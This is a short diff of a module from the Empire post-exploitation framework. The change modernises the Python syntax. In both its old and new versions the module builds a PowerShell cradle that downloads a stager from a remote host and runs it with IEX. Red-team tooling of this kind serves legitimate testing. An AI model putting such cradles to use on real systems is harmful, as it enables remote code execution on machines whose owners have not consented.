@@ -1,15 +1,12 @@
-from __future__ import print_function
-
 import base64
 import re
-from builtins import object, str
 from typing import Dict
 
 from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -37,9 +34,8 @@ class Module(object):
             blank_command = ""
             powershell_command = ""
             encoded_cradle = ""
-            cradle = (
-                "IEX \"(new-object net.webclient).downloadstring('%s:%s/%s')\"|IEX"
-                % (host, port, stager)
+            cradle = "IEX \"(new-object net.webclient).downloadstring('{}:{}/{}')\"|IEX".format(
+                host, port, stager
             )
             # Remove weird chars that could have been added by ISE
             n = re.compile("(\xef|\xbb|\xbf)")
